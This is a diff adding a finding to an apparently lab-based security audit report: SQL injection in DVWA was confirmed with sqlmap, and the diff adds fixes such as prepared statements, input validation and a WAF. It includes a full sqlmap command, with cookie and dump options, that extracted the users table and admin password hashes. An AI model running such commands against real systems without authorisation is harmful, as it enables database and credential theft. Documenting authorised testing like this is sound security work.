@@ -42,10 +42,40 @@ See `audit-scope-and-goals.md` for the original audit scope and objectives.
 
 Full raw report: [openvas-report.pdf](openvas-report.pdf)
 
+### Web Application Vulnerability – SQL Injection (Automated Exploitation with sqlmap)
+
+**Rationale**  
+Automated network scanners like OpenVAS do not perform interactive form-based testing. Targeted testing with sqlmap confirmed SQL injection in DVWA's low-security mode, allowing full enumeration of the users table.
+
+**Tool Used**: sqlmap
+
+**Command Executed** (from Kali-Tools VM):
+
+sqlmap -u "http://192.168.56.101/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
+  --cookie="security=low; PHPSESSID=isqqnaj12ctdpqnsgqdv2l8tp9" \
+  --headers="Referer: http://192.168.56.101/dvwa/vulnerabilities/sqli/" \
+  --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36" \
+  --batch --dump --level=2 --risk=2 \
+  --dbms=mysql --technique=B \
+  --ignore-redirects \
+  --flush-session
+
+**Impact**:
+Critical (CVSS ~9.8) – Unauthorized extraction of all user records, including admin credentials (MD5 hashes crackable offline).
+
+**Evidence**:
+
+Screenshot of sqlmap successful dump: screenshots/sqlmap-users-dump.png
+
 ## Recommendations
 
 1. **Immediate**:
    - Disable TCP timestamps on the server to eliminate uptime disclosure.
+   - Use prepared statements with bound parameters (PDO with bindParam in PHP)
+   - Implement strict input validation and output escaping
+   - Disable detailed error messages in production (display_errors = Off in php.ini)
+   - Deploy a Web Application Firewall (WAF) such as ModSecurity
+   - Set application security level to "High" or "Impossible" in production environments
 2. **Follow-up**:
    - Re-scan after mitigation to confirm resolution.
    - Perform targeted web application scanning (e.g., Nikto, OWASP ZAP) on DVWA to identify SQL injection, XSS, etc.
